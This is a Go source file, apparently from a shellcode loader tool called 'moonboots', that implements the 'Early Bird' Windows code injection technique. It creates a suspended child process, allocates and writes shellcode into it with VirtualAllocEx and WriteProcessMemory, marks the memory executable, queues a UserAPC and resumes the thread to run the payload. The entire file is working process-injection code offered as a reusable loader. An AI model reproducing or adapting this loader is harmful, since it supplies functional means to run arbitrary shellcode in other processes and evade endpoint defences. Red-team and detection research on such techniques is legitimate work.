package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

// Concept pulled from https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/

/*
	This technique executes shellcode in a child process using the following steps:
		1. Create a child proccess in a suspended state with CreateProcessW
		2. Allocate RW memory in the child process with VirtualAllocEx
		3. Write shellcode to the child process with WriteProcessMemory
		4. Change the memory permissions to RX with VirtualProtectEx
		5. Add a UserAPC call that executes the shellcode to the child process with QueueUserAPC
		6. Resume the suspended program with ResumeThread function
*/

const (
	LdrEarlyBird = "earlybird"
)

type EarlyBirdLoader struct {
	Base
}

func init() {
	ldr := &EarlyBirdLoader{}
	ldr.SuspendProcess = true
	ldr.Injector = true

	AvailableLoaders.Register(LdrEarlyBird, ldr)
}

func (ldr EarlyBirdLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func (ldr EarlyBirdLoader) Run(shellcode []byte) error {
	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	// Allocate memory in child process
	log.Debugf("Calling VirtualAllocEx on PID %d...", ldr.TargetProcess.ProcessId)
	addr, _, err := VirtualAllocEx.Call(uintptr(ldr.TargetProcess.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed and returned 0")
	}
	log.Printf("Successfully allocated memory in PID %d", ldr.TargetProcess.ProcessId)
	log.Debugf("Shellcode address: 0x%x", addr)

	// Write shellcode into child process memory
	log.Debugf("Calling WriteProcessMemory on PID %d...", ldr.TargetProcess.ProcessId)
	_, _, err = WriteProcessMemory.Call(uintptr(ldr.TargetProcess.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling WriteProcessMemory: %s", err)
	}
	log.Printf("Successfully wrote %d shellcode bytes to PID %d", len(shellcode), ldr.TargetProcess.ProcessId)

	// Change memory permissions to RX in child process where shellcode was written
	log.Debugf("Calling VirtualProtectEx on PID %d...", ldr.TargetProcess.ProcessId)
	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(ldr.TargetProcess.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtectEx: %s", err)
	}
	log.Printf("Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", ldr.TargetProcess.ProcessId)

	// QueueUserAPC
	log.Debugln("Calling QueueUserAPC")

	ret, _, err := QueueUserAPC.Call(addr, uintptr(ldr.TargetProcess.Thread), 0)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling QueueUserAPC: %s", err)
	}
	log.Debugf("The QueueUserAPC call returned %v\n", ret)
	log.Printf("Successfully queued a UserAPC on process ID %d\n", ldr.TargetProcess.ProcessId)

	// Resume the child process
	log.Debugln("Calling ResumeThread...")
	_, err = windows.ResumeThread(ldr.TargetProcess.Thread)
	if err != nil {
		return fmt.Errorf("Error calling ResumeThread: %s", err)
	}
	log.Println("Process resumed and shellcode executed")

	return nil
}
